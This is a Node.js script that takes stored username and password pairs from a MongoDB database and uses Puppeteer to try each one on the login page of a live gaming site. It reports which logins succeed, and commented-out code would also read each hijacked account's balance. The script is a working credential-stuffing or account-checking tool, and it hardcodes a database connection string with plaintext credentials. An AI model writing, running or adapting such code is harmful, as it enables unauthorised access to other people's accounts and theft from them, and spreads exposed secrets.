const puppeteer = require('puppeteer');
const mongoose = require('mongoose')


let mongoURI = 'mongodb+srv://saif:saif@cluster0.szwmr.mongodb.net/gameonacc?retryWrites=true&w=majority';
// DB Connection

mongoose.connect(mongoURI, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
  useFindAndModify: false
}).then(()=> {
  console.log('database connected')
}).catch(error => console.log('something went wrong'))



const accounts = mongoose.Schema({
  username: { type: String},
  password: { type: String }
});

let Account = mongoose.model('Accounts', accounts)


async function main(){
  
  	  const browser = await puppeteer.launch({headless: false});
	  const page = await browser.newPage();
	  await page.goto('https://gameon7.com/userlogin', {waitUntil: 'networkidle2'});
	  let accounts = await Account.find({}).lean()
	
	  for(let i=0; i< accounts.length; i++){
	  	let username = accounts[i].username
	  	let newPass = accounts[i].password.split("\r\n")
	  	let password = newPass[0]
	  	
	  	// check accounts
	  	let data = await check(page, username, password)
	  	console.log(data)
	  }
	  
  
};

async function check(page, username, password){
	return new Promise(async (resolve, reject) => {

		await page.type('input[name=username]', username)
		await page.type('input[name=password]', password)
		await page.click('.btn-primary')

		await page.waitForTimeout(2000)

		if(await page.$(".alert")){
			resolve({
				found:0,
				balance:0,
				msg:'incorrect'
			})
		}else{
			resolve({
				found:0,
				balance:0,
				msg:'correct'
			})
		}





			//   try{
			//   	await page.waitForSelector("#dropdown04")
			// 	await page.click("#dropdown04")
			// 	const element = await page.$("#user_balance");
	  //   		const text = await page.evaluate(element => element.textContent, element);
	  //   		await page.click('#topNavbar > ul.navbar-nav.ml-auto > li > div > div > div > div > a:nth-child(6)')
			// 	resolve({
			// 		username:username,
			// 		password:password,
			// 		found:1,
			// 		balance:text
			// 	})
			// }catch(err){
			// 	reject({
			// 		found:0,
			// 		balance:0
			// 	})
			// }
		


	})
}

main()